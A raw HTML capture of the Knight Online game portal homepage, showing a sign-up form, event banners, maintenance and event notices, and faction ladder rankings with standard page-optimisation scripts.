maxlength="16" tabindex="3" id="pw" onblur="">					<br>	<input type="hidden" id="idcheckkey" name="idcheckkey" value="">	<input type="hidden" id="emailcheckkey" name="emailcheckkey" value="">	<input type="hidden" id="referalurl" name="referalurl" value="//www.nttgame.com/en/register/signupPopup/">					<label>Captcha <span class="gnb-grey-link pull-right" style="font-size:12px;">Type the characters in the box. <br>Answers are CASE-SENSITIVE.</span></label>					<br><input type="text" class="half_input" style="width: 45% !important;" name="captcha" id="captcha" maxlength="7" tabindex="5" onblur="return Signin._checkup('captcha');">					<a href="javascript:void(0);" onclick="return Signin._captcahreload();"><img src="//image.nttgame.com/filegate/www/portal/images/tr/captcha_refresh.png" width="29" height="29"></a>					<span><img style=" vertical-align: middle" src="//www.nttgame.com/en/register/create_captcha/190/40?t=1524934584561&amp;pos=register&amp;g=knight" id="captchaframe"></span>					<br>				<div class="minor_register_text gnb-grey-link">I acknowledge that I have read and agree to the  <a href="//www.nttgame.com/en/corporate/useragreement" target="_blank"><span class="underline">User Agreement</span></a>, <a href="//www.nttgame.com/en/corporate/privacypolicy" target="_blank"><span class="underline">Privacy Policy</span></a> and <a href="//www.nttgame.com/en/corporate/rulesofconduct" target="_blank"><span class="underline">Rules of Conduct</span></a>. (If you are 13 or older but under the age of majority in your country of residence, you must review this User Agreement with your parent or legal guardian.)</div>					<br>					<div class="action_btns">                <div class="btn btn_red" style="width: 100%; text-align:center;" onclick="javascript:Signin._SignUp();" tabindex="6">AGREE &amp; SUBMIT</div>					</div>				</form>			</div>		</section>	</div></div></div>


<!--main_bg start
<div class="main_bg">--> 
<!--container start-->
<div class="container"> 

	<!-- HOME TOP /Main Event Banner -->
	
	<style>section.pop_loadblock{background:rgba(15,19,26,.95) none repeat scroll 0 0;display:none;height:100%;position:fixed;right:0;top:0;width:100%;z-index:3000}div.pop_img_box{background:#0f131a none repeat scroll 0 0;border:1px solid #666;box-shadow:0 0 0 2px #414449;margin:0 auto;padding:0;position:relative;top:10em;width:960px}</style>
	
	<header>
		<div class="top_deco">
            <div class="main-top-area">
                <a href=""><script data-pagespeed-no-defer="">//<![CDATA[
(function(){for(var g="function"==typeof Object.defineProperties?Object.defineProperty:function(b,c,a){if(a.get||a.set)throw new TypeError("ES3 does not support getters and setters.");b!=Array.prototype&&b!=Object.prototype&&(b[c]=a.value)},h="undefined"!=typeof window&&window===this?this:"undefined"!=typeof global&&null!=global?global:this,k=["String","prototype","repeat"],l=0;l<k.length-1;l++){var m=k[l];m in h||(h[m]={});h=h[m]}var n=k[k.length-1],p=h[n],q=p?p:function(b){var c;if(null==this)throw new TypeError("The 'this' value for String.prototype.repeat must not be null or undefined");c=this+"";if(0>b||1342177279<b)throw new RangeError("Invalid count value");b|=0;for(var a="";b;)if(b&1&&(a+=c),b>>>=1)c+=c;return a};q!=p&&null!=q&&g(h,n,{configurable:!0,writable:!0,value:q});var t=this;function u(b,c){var a=b.split("."),d=t;a[0]in d||!d.execScript||d.execScript("var "+a[0]);for(var e;a.length&&(e=a.shift());)a.length||void 0===c?d[e]?d=d[e]:d=d[e]={}:d[e]=c};function v(b){var c=b.length;if(0<c){for(var a=Array(c),d=0;d<c;d++)a[d]=b[d];return a}return[]};function w(b){var c=window;if(c.addEventListener)c.addEventListener("load",b,!1);else if(c.attachEvent)c.attachEvent("onload",b);else{var a=c.onload;c.onload=function(){b.call(this);a&&a.call(this)}}};var x;function y(b,c,a,d,e){this.h=b;this.j=c;this.l=a;this.f=e;this.g={height:window.innerHeight||document.documentElement.clientHeight||document.body.clientHeight,width:window.innerWidth||document.documentElement.clientWidth||document.body.clientWidth};this.i=d;this.b={};this.a=[];this.c={}}function z(b,c){var a,d,e=c.getAttribute("data-pagespeed-url-hash");if(a=e&&!(e in b.c))if(0>=c.offsetWidth&&0>=c.offsetHeight)a=!1;else{d=c.getBoundingClientRect();var f=document.body;a=d.top+("pageYOffset"in window?window.pageYOffset:(document.documentElement||f.parentNode||f).scrollTop);d=d.left+("pageXOffset"in window?window.pageXOffset:(document.documentElement||f.parentNode||f).scrollLeft);f=a.toString()+","+d;b.b.hasOwnProperty(f)?a=!1:(b.b[f]=!0,a=a<=b.g.height&&d<=b.g.width)}a&&(b.a.push(e),b.c[e]=!0)}y.prototype.checkImageForCriticality=function(b){b.getBoundingClientRect&&z(this,b)};u("pagespeed.CriticalImages.checkImageForCriticality",function(b){x.checkImageForCriticality(b)});u("pagespeed.CriticalImages.checkCriticalImages",function(){A(x)});function A(b){b.b={};for(var c=["IMG","INPUT"],a=[],d=0;d<c.length;++d)a=a.concat(v(document.getElementsByTagName(c[d])));if(a.length&&a[0].getBoundingClientRect){for(d=0;c=a[d];++d)z(b,c);a="oh="+b.l;b.f&&(a+="&n="+b.f);if(c=!!b.a.length)for(a+="&ci="+encodeURIComponent(b.a[0]),d=1;d<b.a.length;++d){var e=","+encodeURIComponent(b.a[d]);131072>=a.length+e.length&&(a+=e)}b.i&&(e="&rd="+encodeURIComponent(JSON.stringify(B())),131072>=a.length+e.length&&(a+=e),c=!0);C=a;if(c){d=b.h;b=b.j;var f;if(window.XMLHttpRequest)f=new XMLHttpRequest;else if(window.ActiveXObject)try{f=new ActiveXObject("Msxml2.XMLHTTP")}catch(r){try{f=new ActiveXObject("Microsoft.XMLHTTP")}catch(D){}}f&&(f.open("POST",d+(-1==d.indexOf("?")?"?":"&")+"url="+encodeURIComponent(b)),f.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),f.send(a))}}}function B(){var b={},c;c=document.getElementsByTagName("IMG");if(!c.length)return{};var a=c[0];if(!("naturalWidth"in a&&"naturalHeight"in a))return{};for(var d=0;a=c[d];++d){var e=a.getAttribute("data-pagespeed-url-hash");e&&(!(e in b)&&0<a.width&&0<a.height&&0<a.naturalWidth&&0<a.naturalHeight||e in b&&a.width>=b[e].o&&a.height>=b[e].m)&&(b[e]={rw:a.width,rh:a.height,ow:a.naturalWidth,oh:a.naturalHeight})}return b}var C="";u("pagespeed.CriticalImages.getBeaconData",function(){return C});u("pagespeed.CriticalImages.Run",function(b,c,a,d,e,f){var r=new y(b,c,a,e,f);x=r;d&&w(function(){window.setTimeout(function(){A(r)},0)})});})();pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','http://www.nttgame.com/knight/en','SdRLUfP5GX',true,false,'mwTQVUj0ZY4');
//]]></script><img src="//image.nttgame.com/knight/images/renew/en/knight_logo_main.png" class="knight-logo" data-pagespeed-url-hash="2641012556" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></a>
            </div>
            <!--[Start]Modified element in 2017-->
            <!--[Start] Top Banner-->
            <article class="top_banner">
				<ul class="anim-slider banner_list">
                    <!--banner image size:970x370px-->
																																										<li class="anim-slide animated fadeOut" style="background-image:url(//image.nttgame.com/filegate/knight/images/banner/image/jdsyJzXSUmBcgWZ.png);background-repeat:no-repeat;background-size:cover;cursor:pointer" onclick="javascript:window.open('http://nttga.me/knightroyaleguide', '_blank');">
																										</li>
								
																
																																																		<li class="anim-slide animated fadeOut" style="background-image:url(//image.nttgame.com/filegate/knight/images/banner/image/pJVRkeWznAM9xL8.png);background-repeat:no-repeat;background-size:cover;cursor:pointer" onclick="javascript:window.open('http://nttga.me/wheelisback', '_blank');">
																										</li>
								
																
																																							<li class="anim-slide animated fadeOut" style="background-image:url(//image.nttgame.com/filegate/knight/images/banner/image/mdjC5K91nqy6Wv2.png);background-repeat:no-repeat;background-size:cover;cursor:pointer" onclick="javascript:window.open('http://nttga.me/aprilforumevent', '_blank');">
																										</li>
								
																
																																																		<li class="anim-slide animated fadeIn delay0.5s anim-slide-this" style="background-image:url(//image.nttgame.com/filegate/knight/images/banner/image/RJmbXHPE9eDck5U.png);background-repeat:no-repeat;background-size:cover;cursor:pointer" onclick="javascript:window.open('http://nttga.me/bountyhunter', '_blank');">
																										</li>
								
																
																																																		<li class="anim-slide animated fadeOut" style="background-image:url(//image.nttgame.com/filegate/knight/images/banner/image/QZvcry41bK9wgtp.png);background-repeat:no-repeat;background-size:cover;cursor:pointer" onclick="javascript:window.open('https://goo.gl/w82Lh3', '_blank');">
																										</li>
								
																
																														
							
					
					
										<nav class="anim-arrows">
						<span class="anim-arrows-prev top_banner_prev">
							<a href="javascript:void(0);"></a>
						</span>
						<span class="anim-arrows-next top_banner_next">
							<a href="javascript:void(0);"></a>
						</span>
					</nav>
					                <div class="anim-dots"><span class=""></span><span class=""></span><span class=""></span><span class="anim-dots-this"></span><span class=""></span></div></ul>
				
								
				
            </article>
            <!--[End] Top Banner-->
            <!--[End]Modified element in 2017-->
		</div>
	</header>
	
	<map name="knightlogo">
		<area shape="POLY" href="" coords="100,15,300,15,300,85,200,120,100,85" alt="Knight Online - Free to Play!">
	</map>
	
	
	<!--CONTENTS START-->
	<div class="contents">
    
		<!-- MENU NAVIGATION -->
			
	<div id="navi-container">		
		<nav id="navi_main" class="navi_main">
			<ul>
				<li>
					<a href="javascript:void(0);">
					<div class="guide"></div>
					</a>
				</li>
				<li>
					<a href="javascript:void(0);">
					<div class="news"></div>
					</a>
				</li>
				<li>
					<a href="javascript:void(0);">
					<div class="rank"></div>
					</a>
				</li>
				<li>
					<a href="javascript:void(0);">
					<div class="store"></div>
					</a>
				</li>
				<li>
					<a href="javascript:void(0);">
					<div class="download"></div>
					</a>
				</li>
				<li>
					<a href="javascript:void(0);">
					<div class="community"></div>
					</a>
				</li>
			</ul>			
		</nav>

		<!-- SUB MENU NAVIGATION -->
		

		<nav class="dropdown" id="top-sub-menu-list">
			<ul class="guide">
				<li><a href="//www.nttgame.com/knight/en/guide/introduction/">Introduction</a></li>
				<li><a href="//www.nttgame.com/knight/en/guide/installation/">Installation</a></li>
				<li><a href="//www.nttgame.com/knight/en/guide/character/">Character</a></li>
				<li><a href="//www.nttgame.com/knight/en/guide/zones/">Zones</a></li>
				<li><a href="//www.nttgame.com/knight/en/guide/enjoyknight/">Enjoy Knight</a></li>
				</ul>
				<ul class="news">
				<li><a href="//www.nttgame.com/knight/en/news/notices">Announcement</a></li>
				<li><a href="//www.nttgame.com/knight/en/news/events">Event</a></li>
				<li><a href="//www.nttgame.com/knight/en/news/update">Update</a></li>
				</ul>
				<ul class="rank">
				<!-- <li><a href="//www.nttgame.com/knight/en/rank/index/">Total</a></li> -->
				<li><a href="//www.nttgame.com/knight/en/rank/ladder/">Ladder</a></li>
				<!-- <li><a href="//www.nttgame.com/knight/en/rank/hero/">Hero</a></li> -->
				<li><a href="//www.nttgame.com/knight/en/rank/knights/">Knights</a></li>
				<li><a href="//www.nttgame.com/knight/en/rank/clan/">Clan</a></li>
				<!-- <li><a href="//www.nttgame.com/knight/en/rank/battle/">Battle</a></li> -->
				</ul>
				<ul class="store">
				<li><a href="//www.nttgame.com/knight/en/store/powerupstore/">Power Up Store</a></li>
				<li><a href="//www.nttgame.com/knight/en/store/webshop/" target="_blank">Web Shop</a></li>
				</ul>
				<ul class="download">
				<li><a href="//www.nttgame.com/knight/en/download/client/">Client Download</a></li>
				<li><a href="//www.nttgame.com/knight/en/download/fansitekit/">Fansite Kit</a></li>
				<li><a href="//www.nttgame.com/knight/en/download/wallpaper/">Wallpaper</a></li>
				</ul>
				<ul class="community">
				<li><a href="//www.nttgame.com/knight/en/community/tournament_live">Tournament Broadcast</a></li>
				<li><a href="//www.nttgame.com/knight/en/community/forum">Official Forum</a></li>
				<!-- <li><a href="javascript:void(0);">Knight Wiki</a></li> -->
				<li><a href="//www.nttgame.com/knight/en/community/tournament_status">Tournament Status</a></li>
			</ul>
		</nav>

	</div>



		

		
		<!-- HOME LEFT SECTION -->
		
<script type="text/javascript">$(function(){$('.popup-modal').magnificPopup({type:'inline',preloader:false,focus:'#username',modal:true});$(document).on('click','.popup-modal-dismiss',function(e){e.preventDefault();$.magnificPopup.close();});});</script>
<style type="text/css">.white-popup-block{width:500px;margin:0 auto;background-color:#fff;padding:30px}</style>

<aside class="left_side" style="line-height:1px;">
	<a href="javascript:void(0)" class="open-gnb-login" data-target="#modalLogin"> 
		<div class="login"></div>
	</a>
	<a href="javascript:void(0)" class="gnb-register-btn" data-target="#modalSignup" data-url="//www.nttgame.com/knight/en/register/signupPopup/}">
        <div class="register"></div>
    </a>
	<img src="//image.nttgame.com/filegate/knight/images/131218/line.png" data-pagespeed-url-hash="2722351376" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"><br>
	<a href="https://billing.nttgame.com/payment/payment.aspx" target="_blank">
	<div class="recharge"></div>
	</a> 
	<a href="https://billing.nttgame.com/payment/payment.aspx?frameurl=/payment/FreeNpoints.aspx" target="_blank">
	<div class="free"></div>
	</a>
	
	<img src="//image.nttgame.com/filegate/knight/images/131218/line.png" data-pagespeed-url-hash="2722351376" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"><br>

	<a href="javascript:void(0)" class="open-gnb-login" data-target="#modalLogin"> 
	<div class="promo"></div>
	</a> 
	<img src="//image.nttgame.com/filegate/knight/images/131218/line.png" data-pagespeed-url-hash="2722351376" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"><br>

	<a href="//www.nttgame.com/knight/en/store/webshop/" target="_blank">
	<div class="powerup"></div>
	</a> 
	<img src="//image.nttgame.com/filegate/knight/images/131218/line.png" data-pagespeed-url-hash="2722351376" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"><br>

	<a href="http://otp.nttgame.com/" target="_blank">
	<div class="ics"></div>
	</a> 
</aside>


    
		<!--main contents start-->
		
<style type="text/css">.mfp-iframe-holder .mfp-content{max-width:980px!important;height:718px!important}.mfp-iframe-scaler iframe{overflow-y:hidden}.mfp-iframe-holder .mfp-close{left:-22px;top:2px}.mfp-close{display:none!important}</style>

    <section class="main_content" style="margin-top:25px;"> 
		<!--announcement start-->
		<article class="announcement">
			<img src="//image.nttgame.com/knight/images/renew/en/main_announcement.png" alt="Announcement" title="Announcement" data-pagespeed-url-hash="1344841266" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
			<div class="tab-box"> 
				<a href="javascript:;" class="tabLink activeLink" id="cont-1"> &nbsp;All&nbsp;</a> 
				<a href="javascript:;" class="tabLink" id="cont-2">Notice</a> 
				<a href="javascript:;" class="tabLink" id="cont-3">Event</a> 
							</div>
			
			<div class="tabcontent" id="cont-1-1">
				<div class="more_main"> 
					<!-- <a href="//www.nttgame.com/knight/en/news/all"><img src="//image.nttgame.com/filegate/knight/images/131218/more.png" alt="more" title="more"/></a> --> 
				</div>
				<table class="tabtext">
					<caption>
					<!--all-->
					</caption>
					<thead>
					  <tr>
						<th class="title"></th>
						<th class="main_date"></th>
					  </tr>
					</thead>
					<tbody>
																												
																																										
																
																	<tr>
										<td><div class="notice notice-en">NOTICE</div>
										<a href="//www.nttgame.com/knight/en/news/noticeview/0/2506">[Maintenance] 26th of April, at 2:00 Server Time</a></td>
										<td style="width:90px;"><span class="dategrey">2 days ago</span></td>
									</tr>
									<tr>
										<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
									</tr>
								
								
																			
																							
																																										
																
																	<tr>
										<td><div class="notice notice-en">NOTICE</div>
										<a href="//www.nttgame.com/knight/en/news/noticeview/0/2501">[Knight] Maintenance 19th of April, at 2:00 Server...</a></td>
										<td style="width:90px;"><span class="dategrey">9 days ago</span></td>
									</tr>
									<tr>
										<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
									</tr>
								
								
																			
																																										
																
																	<tr>
										<td><div class="event event-en">EVENT</div>
										<a href="//www.nttgame.com/knight/en/news/eventview/0/2490">Wheel of Fun Is Back!</a></td>
										<td style="width:90px;"><span class="dategrey">22 days ago</span></td>
									</tr>
									<tr>
										<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
									</tr>
								
								
																			
																							
																							
																																										
																
																	<tr>
										<td><div class="notice notice-en">NOTICE</div>
										<a href="//www.nttgame.com/knight/en/news/noticeview/0/2474">Party Tournament Winner Is CHILL!</a></td>
										<td style="width:90px;"><span class="dategrey">One month ago</span></td>
									</tr>
									<tr>
										<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
									</tr>
								
								
																			
																																										
																
																	<tr>
										<td><div class="event event-en">EVENT</div>
										<a href="//www.nttgame.com/knight/en/news/eventview/0/2471">Black Treasure Chest Event</a></td>
										<td style="width:90px;"><span class="dategrey">One month ago</span></td>
									</tr>
									<tr>
										<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
									</tr>
								
								
																			
																							
																																										
																
																	<tr>
										<td><div class="notice notice-en">NOTICE</div>
										<a href="//www.nttgame.com/knight/en/news/noticeview/0/2449">Party Tournament Registrations Started!</a></td>
										<td style="width:90px;"><span class="dategrey">2 months ago</span></td>
									</tr>
									<tr>
										<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
									</tr>
								
								
																			
																							
																																										
																
																	<tr>
										<td><div class="event event-en">EVENT</div>
										<a href="//www.nttgame.com/knight/en/news/eventview/0/2443">Show Your Love and Earn Reward</a></td>
										<td style="width:90px;"><span class="dategrey">2 months ago</span></td>
									</tr>
									<tr>
										<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
									</tr>
								
								
																			
																							
																							
																							
																																										
																
																	<tr>
										<td><div class="event event-en">EVENT</div>
										<a href="//www.nttgame.com/knight/en/news/eventview/0/2424">Winter Events!</a></td>
										<td style="width:90px;"><span class="dategrey">3 months ago</span></td>
									</tr>
									<tr>
										<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
									</tr>
								
								
																			
											 			
					</tbody>
					<tfoot>
					  <tr>
						<td></td>
						<td></td>
					  </tr>
					</tfoot>
				  </table>
			</div>
			<div class="tabcontent hide" id="cont-2-1">
				<div class="more_main"> 
					<a href="//www.nttgame.com/knight/en/news/notices"><img src="//image.nttgame.com/filegate/knight/images/131218/more.png" alt="more" title="more" data-pagespeed-url-hash="1139432957" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></a> 
				</div>
				  <table class="tabtext">
					<caption>
					<!--notice-->
					</caption>
					<thead>
					  <tr>
						<th class="title"></th>
						<th class="main_date"></th>
					  </tr>
					</thead>
					<tbody>
																																																																
																<tr>
									<td><div class="notice">NOTICE</div>
									<a href="//www.nttgame.com/knight/en/news/noticeview/0/2506">[Maintenance] 26th of April, at 2:00 Server Time</a></td>
									<td style="width:90px;"><span class="dategrey">2 days ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																																																
																<tr>
									<td><div class="notice">NOTICE</div>
									<a href="//www.nttgame.com/knight/en/news/noticeview/0/2501">[Knight] Maintenance 19th of April, at 2:00 Server...</a></td>
									<td style="width:90px;"><span class="dategrey">9 days ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																																																
																<tr>
									<td><div class="notice">NOTICE</div>
									<a href="//www.nttgame.com/knight/en/news/noticeview/0/2497">[Knight] Maintenance 12th of April, at 2:00 Server...</a></td>
									<td style="width:90px;"><span class="dategrey">16 days ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																															
																<tr>
									<td><div class="notice">NOTICE</div>
									<a href="//www.nttgame.com/knight/en/news/noticeview/0/2494">[Knight] Maintenance 10th of April, at 2:00 Server...</a></td>
									<td style="width:90px;"><span class="dategrey">18 days ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																																																
																<tr>
									<td><div class="notice">NOTICE</div>
									<a href="//www.nttgame.com/knight/en/news/noticeview/0/2488">[Maintenance] 5th of April, at 2:00 Server Time</a></td>
									<td style="width:90px;"><span class="dategrey">23 days ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																																																																	
																<tr>
									<td><div class="notice">NOTICE</div>
									<a href="//www.nttgame.com/knight/en/news/noticeview/0/2483">[Maintenance] 28th of March, at 2:00 Server Time</a></td>
									<td style="width:90px;"><span class="dategrey">One month ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																																																
																<tr>
									<td><div class="notice">NOTICE</div>
									<a href="//www.nttgame.com/knight/en/news/noticeview/0/2478">[Maintenance] 22nd of March, at 2:00 Server Time</a></td>
									<td style="width:90px;"><span class="dategrey">One month ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																											
					
	
					</tbody>
					<tfoot>
					  <tr>
						<td></td>
						<td></td>
					  </tr>
					</tfoot>
				  </table>
			</div>
			<div class="tabcontent hide" id="cont-3-1">
				<div class="more_main"> 
					<a href="//www.nttgame.com/knight/en/news/events"><img src="//image.nttgame.com/filegate/knight/images/131218/more.png" alt="more" title="more" data-pagespeed-url-hash="1139432957" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></a> 
				</div>
				  <table class="tabtext">
					<caption>
					<!--Event-->
					</caption>
					<thead>
					  <tr>
						<th class="title"></th>
						<th class="main_date"></th>
					  </tr>
					</thead>
					<tbody>
																																															
																<tr>
									<td><div class="event">EVENT</div>
									<a href="//www.nttgame.com/knight/en/news/eventview/0/2490">Wheel of Fun Is Back!</a></td>
									<td style="width:90px;"><span class="dategrey">22 days ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																																																
																<tr>
									<td><div class="event">EVENT</div>
									<a href="//www.nttgame.com/knight/en/news/eventview/0/2471">Black Treasure Chest Event</a></td>
									<td style="width:90px;"><span class="dategrey">One month ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																																																
																<tr>
									<td><div class="event">EVENT</div>
									<a href="//www.nttgame.com/knight/en/news/eventview/0/2443">Show Your Love and Earn Reward</a></td>
									<td style="width:90px;"><span class="dategrey">2 months ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																																																																																		
																<tr>
									<td><div class="event">EVENT</div>
									<a href="//www.nttgame.com/knight/en/news/eventview/0/2424">Winter Events!</a></td>
									<td style="width:90px;"><span class="dategrey">3 months ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																															
																<tr>
									<td><div class="event">EVENT</div>
									<a href="//www.nttgame.com/knight/en/news/eventview/0/2423">Tower Defence Part II</a></td>
									<td style="width:90px;"><span class="dategrey">3 months ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																															
																<tr>
									<td><div class="event">EVENT</div>
									<a href="//www.nttgame.com/knight/en/news/eventview/0/2389">Tower Defence!</a></td>
									<td style="width:90px;"><span class="dategrey">4 months ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																																																																
																<tr>
									<td><div class="event">EVENT</div>
									<a href="//www.nttgame.com/knight/en/news/eventview/0/2387">Full Moon Token Event!</a></td>
									<td style="width:90px;"><span class="dategrey">4 months ago</span></td>
								</tr>
								<tr>
									<td class="table_line" colspan="2"><img src="//image.nttgame.com/knight/images/renew/en/main_line.png" data-pagespeed-url-hash="1022303479" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></td>
								</tr>
																																												
					

					</tbody>
					<tfoot>
					  <tr>
						<td></td>
						<td></td>
					  </tr>
					</tfoot>
				  </table>
			</div>
			<div class="tabcontent hide" id="cont-4-1">
				<div class="more_main"> 
					<a href="//www.nttgame.com/knight/en/news/update"><img src="//image.nttgame.com/filegate/knight/images/131218/more.png" alt="more" title="more" data-pagespeed-url-hash="1139432957" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></a> 
				</div>
				  <table class="tabtext">
					<caption>
					<!--Update-->
					</caption>
					<thead>
					  <tr>
						<th class="title"></th>
						<th class="main_date"></th>
					  </tr>
					</thead>
					<tbody>
															</tbody>
					<tfoot>
					  <tr>
						<td></td>
						<td></td>
					  </tr>
					</tfoot>
				  </table>
			</div>			
       </article>
      <!--announcement end--> 


	<!--rank start-->
	<script type="text/javascript" src="//image.nttgame.com/knight/files/knight_main_rank_xml.js"></script>
	<article class="rank">
		<img src="//image.nttgame.com/knight/images/renew/en/main_rank.png" alt="Rank" title="Rank" class="title" data-pagespeed-url-hash="3440313431" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
        <div class="tab-box"> 
			<a href="javascript:void(0);" onclick="javascript:show_rank(1,1);" class="tabLink_b activeLink" id="cont_b-11"> Ladder</a> 
			<a href="javascript:void(0);" onclick="javascript:show_rank(2,1);" class="tabLink_b" id="cont_b-12">Knight</a> 
			<a href="javascript:void(0);" onclick="javascript:show_rank(3,1);" class="tabLink_b" id="cont_b-13">Clan</a> 
			<a href="javascript:void(0);" onclick="javascript:show_rank(4,1);" class="tabLink_b" id="cont_b-14">War</a>
			<form name="form" id="form" class="area">
			<input type="hidden" id="rank_menu" name="rank_menu" value="1">
			<select name="jumpMenu" id="nServer_all">
											<option value="1">ARES</option>
															<option value="2">DIEZ</option>
															<option value="3">GORDION</option>
															<option value="4">ROSETTA</option>
																						<option value="6">OLYMPIA</option>
																						<option value="8">MANES</option>
																																																																																												<option value="20">DESTAN</option>
										</select>
			</form>
        </div>
        <div class="more_main"> 
			<a id="rank-more-link" href="javascript:void(0);"><img src="//image.nttgame.com/filegate/knight/images/131218/more.png" data-pagespeed-url-hash="1139432957" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></a> </div>
		<div class="rank_location"><span id="str-menu" class="capitalize">Ladder</span> &gt; <span id="str-server" class="capitalize" style="text-transform: initial;">ARES</span></div>
		<!-- Rank List -->
		<div class="" id="rank_list"><div id="rank_title"><table class="tableTitle"><tbody><tr>  <th class="karus">Karus</th>  <th class="elmorad">El morad</th></tr></tbody></table></div><div class="clear"></div><div id="rank_list"><table class="tableRank"><tbody><tr>	<td><span class="rank-number karus-rank-number">1</span><span class="num num1">EyVAAAHHHHHHHH</span></td>	<td><span class="rank-number elmorad-rank-number">1</span><span class="num num1 numEl">10WesleySneijder</span></td></tr><tr>	<td><span class="rank-number karus-rank-number">2</span><span class="num num2">Fr0kie</span></td>	<td><span class="rank-number elmorad-rank-number">2</span><span class="num num2 numEl">DanqerousExacting</span></td></tr><tr>	<td><span class="rank-number karus-rank-number">3</span><span class="num num3">AngeLOfSouL</span></td>	<td><span class="rank-number elmorad-rank-number">3</span><span class="num num3 numEl">IK0vAyADeVaMI</span></td></tr><tr>	<td><span class="rank-number karus-rank-number">4</span><span class="num num4">JaimeVeqa</span></td>	<td><span class="rank-number elmorad-rank-number">4</span><span class="num num4 numEl">ITeXaSKaTLiaMI</span></td></tr><tr>	<td><span class="rank-number karus-rank-number">5</span><span class="num num5">IPhantasmagor</span></td>	<td><span class="rank-number elmorad-rank-number">5</span><span class="num num5 numEl">IIBLackGuanTanamo</span></td></tr></tbody></table></div></div>
	
      </article>
      <!--rank end--> 
		
